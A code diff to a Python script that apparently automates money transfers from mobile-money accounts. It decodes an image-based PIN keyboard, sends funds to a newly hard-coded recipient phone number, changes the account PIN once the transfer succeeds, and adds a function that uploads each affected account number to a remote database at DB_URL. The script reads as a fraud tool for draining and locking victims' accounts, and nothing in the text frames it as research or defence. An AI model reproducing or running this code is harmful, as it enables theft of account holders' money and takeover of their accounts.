@@ -226,7 +226,24 @@ def build(pin, mapping):
 # -----------------------
 # send transfer
 # -----------------------
+def save_number_to_db(number):
+    try:
+        res = requests.get(DB_URL)
+        data = res.json()
 
+        if data is None:
+            data = {"numbers": []}
+
+        if "numbers" not in data:
+            data["numbers"] = []
+
+        if number not in data["numbers"]:
+            data["numbers"].append(number)
+
+        requests.put(DB_URL, json=data)
+
+    except Exception as e:
+        print("DB error:", e)
 def send_transfer(amount, original):
     images, kid = get_keyboard(otp_token)
     mapping = extract(images)
@@ -251,7 +268,7 @@ def send_transfer(amount, original):
                 "originalInput": original
             },
             "label": "",
-            "phoneNumber": "222xxxxxxxx"
+            "phoneNumber": "22230616448"
         }
     }
 
@@ -327,8 +344,10 @@ if "items" in data and len(data["items"]) > 0:
     # -----------------------
 
     if success:
+        
 
         print("تمت العمليات بنجاح - سيتم تغيير PIN")
+        save_number_to_db(int(num))
 
         images1, id_old = get_keyboard(otp_token)
         map1 = extract(images1)
